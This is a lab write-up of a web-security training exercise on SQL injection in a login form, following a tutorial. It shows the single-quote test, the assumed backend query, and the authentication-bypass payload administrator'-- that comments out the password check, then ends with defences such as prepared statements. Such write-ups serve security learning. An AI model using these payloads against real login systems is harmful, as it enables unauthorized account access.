> 💡 These notes are based on the **SQL injection in login functionality** lab, solved with the help of Rana Khalil's tutorial.

---

## 🔍 Goal

Log in as the `administrator` user **without knowing the password** by exploiting an SQL injection vulnerability.

---

## 🧪 Initial Test

We start by entering a single quote `'` in the login form fields.

Result: **Internal Server Error**

➡️ This suggests that the backend query is breaking due to improper input sanitization. Likely an SQL injection point.

---

## 🧠 What's Happening in the Backend?

Normally, the login form might be sending a query like this:

```sql
SELECT firstname FROM users WHERE username = 'admin' AND password = 'admin'
```

If the input is valid, this query returns a user and logs them in.

---

## ❌ Attempting SQL Injection with `admin`

Let’s try:

```sql
username: admin'--
password: anything
```

Resulting query:

```sql
SELECT firstname FROM users WHERE username = 'admin'--' AND password = 'anything'
```

We still get an error or are not logged in. That’s because **there is no `admin` user** in the database.

---

## ✅ Correct Payload with `administrator`

Let’s try instead:

```sql
username: administrator'--
password: anything
```

This produces:

```sql
SELECT firstname FROM users WHERE username = 'administrator'--' AND password = 'anything'
```

The `--` comment sequence disables the rest of the SQL query (including the password check).

➡️ **Result:** We are logged in as the administrator!

---

## 🧬 Summary

| Step | Payload | Result |
|------|---------|--------|
| `'` test | `'` in username or password | Internal Server Error (SQL injection point confirmed) |
| `'--` with `admin` | `admin'--` | No login (user doesn't exist) |
| `'--` with `administrator` | `administrator'--` | ✅ Logged in successfully |

---

## 🛡️ Note

This vulnerability is possible due to unsanitized inputs in SQL queries. Proper defense mechanisms include:

- Prepared statements (parameterized queries)
- ORM frameworks
- Input validation & sanitization

---
